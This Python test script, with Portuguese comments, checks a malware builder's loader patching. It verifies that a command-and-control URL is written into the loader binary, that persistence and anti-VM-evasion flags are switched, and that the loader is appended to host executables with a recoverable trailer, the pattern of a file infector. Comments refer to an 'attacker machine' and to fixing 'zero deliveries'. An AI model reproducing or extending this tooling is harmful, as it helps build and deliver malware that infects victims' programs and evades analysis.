#!/usr/bin/env python3
"""Test E: attacker machine -- patch the loader with real bytes.
Uses the loader stored in git (HEAD:bin/loader.exe) purely as a specimen: what is
verified here is the sentinel mechanism, not the binary.
"""
import hashlib, importlib.util, json, os, struct, subprocess, sys

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
OUT = os.path.join(os.environ["TEMP"], "ck_loader_old.exe")


def load_auto():
    sys.path.insert(0, REPO)
    spec = importlib.util.spec_from_file_location("ckauto", os.path.join(REPO, "auto.py"))
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


def git_show(rev, path):
    return subprocess.run(["git", "-C", REPO, "show", "%s:%s" % (rev, path)],
                          capture_output=True, check=True).stdout


def main():
    fails = []

    def check(name, cond, detail=""):
        print(("  PASS  " if cond else "  FAIL  ") + name + ("" if cond else "  <- " + str(detail)[:160]))
        if not cond:
            fails.append(name)

    raw = git_show("HEAD", "bin/loader.exe")
    print("[loader] HEAD:bin/loader.exe %d bytes" % len(raw))

    a = load_auto()
    sys.path.insert(0, REPO)
    import peutil
    sent = a.C2_SENTINEL
    print("[loader] C2_SENTINEL=%r  slot=256" % sent)

    hits = []
    i = raw.find(sent)
    while i != -1:
        hits.append(i)
        i = raw.find(sent, i + 1)
    check("sentinela presente no binario", bool(hits), "sentinel ausente")
    check("o sentinela aparece duas vezes (array + constante memcmp)",
          len(hits) >= 2, hits)

    idx = peutil.find_sentinel(raw, sent, 256)
    other = [h for h in hits if h != idx]
    print("[loader] array=%d  constante=%s" % (idx, other))

    url = "http://192.168.18.74:9400/"
    patched = a._patch_loader(raw, url)
    check("tamanho preservado", len(patched) == len(raw), "%d != %d" % (len(patched), len(raw)))

    slot = patched[idx:idx + 256]
    check("URL escrita no slot do array", slot.rstrip(b"\0") == url.encode(), slot[:40])
    check("slot zero-preenchido", slot[len(url):] == b"\0" * (256 - len(url)))
    # a regressao que custou zero entregas: patch escrevia na constante e o
    # memcmp do loader parava de casar
    check("constante de comparacao intacta", all(patched[o:o + len(sent)] == sent for o in other),
          [patched[o:o + len(sent)] for o in other])

    # idempotencia: patchar de novo nao move nada nem duplica
    twice = a._patch_loader(patched, url)
    check("patch idempotente", twice == patched)

    # URL maior que o slot nao pode estourar
    long_url = "http://" + "a" * 400 + ":9400/"
    p2 = a._patch_loader(raw, long_url)
    check("URL > 255 truncada sem estourar", len(p2) == len(raw) and
          p2[idx:idx + 256].rstrip(b"\0") == long_url.encode()[:255])

    # trailer [loader][host][len][MAGIC] e extraivel
    host = b"MZ" + os.urandom(5000)
    infected = a._patch_loader(raw, url) + host + struct.pack("<I", len(host)) + a.MAGIC
    back = a._extract_original_host(infected)
    check("host original recuperado do trailer", back == host, "%d bytes" % len(back))

    # persist / no-anti-vm sentinelas: array trocado, imediato em .text nao
    pp = a._patch_loader(raw, url, persist=True, no_anti_vm=True)
    pidx = peutil.find_sentinel(raw, a.PERSIST_SENTINEL, 8)
    aidx = peutil.find_sentinel(raw, a.AV_SENTINEL, 8)
    check("array persist trocado", pp[pidx:pidx + 8] == a.PERSIST_ENABLE, pp[pidx:pidx + 8])
    check("array anti-vm trocado", pp[aidx:aidx + 8] == a.AV_DISABLE, pp[aidx:aidx + 8])
    # as copias em .text sao imediatos do codigo: escrever nelas quebra o binario
    phits = [o for o in range(len(raw)) if raw.startswith(a.PERSIST_SENTINEL, o)]
    ahits = [o for o in range(len(raw)) if raw.startswith(a.AV_SENTINEL, o)]
    check("imediato persist em .text intacto",
          all(pp[o:o + 8] == raw[o:o + 8] for o in phits if o != pidx), phits)
    check("imediato anti-vm em .text intacto",
          all(pp[o:o + 8] == raw[o:o + 8] for o in ahits if o != aidx), ahits)
    check("persist/anti-vm nao mudam tamanho", len(pp) == len(raw))

    # amostra antiga: confirma o loopback que causava o zero-delivery
    sample = os.path.join(REPO, "ifec", "apps")
    cands = [os.path.join(sample, f) for f in os.listdir(sample)] if os.path.isdir(sample) else []
    cands = [c for c in cands if os.path.getsize(c) > 200000]
    if cands:
        blob = open(cands[0], "rb").read()
        i = blob.find(b"http://")
        urls = set()
        while i != -1 and len(urls) < 8:
            j = i
            while j < len(blob) and 32 < blob[j] < 127:
                j += 1
            urls.add(blob[i:j].decode("ascii", "replace"))
            i = blob.find(b"http://", j)
        print("[sample] %s  urls=%s" % (os.path.basename(cands[0]), sorted(urls)[:4]))
        check("amostra antiga embutia loopback",
              any("127.0.0.1" in u or "localhost" in u for u in urls), sorted(urls))
    else:
        print("[sample] sem amostra infectada em ifec/apps")

    print("\n=== %d falhas ===" % len(fails))
    for f in fails:
        print("  - " + f)
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
